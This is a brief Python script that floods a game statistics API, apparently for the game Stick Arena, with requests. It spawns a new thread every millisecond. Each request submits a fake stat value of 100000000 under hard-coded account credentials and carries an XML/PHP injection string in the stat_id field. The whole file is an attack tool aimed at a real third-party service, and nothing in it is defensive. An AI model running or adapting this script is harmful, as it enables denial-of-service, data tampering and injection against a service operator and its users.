import threading
import requests
import random

def spam():
    threading.Timer(0.001, spam).start()
    LowerList = ['a', 'b', 'c', 'c', 'e', 'f', 'h', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']
    String = ''.join(random.choice(LowerList) for NameLen in range(20))
    requests.get('http://api.xgenstudios.com/?method=xgen.stats.submit&username=weathernowdays&password=lol&game_id=stickarena&stat_id="></stat></user></game></stats>{}</xml>?></php>echo "lol gg"; ?>&value=100000000'.format(String))
spam()
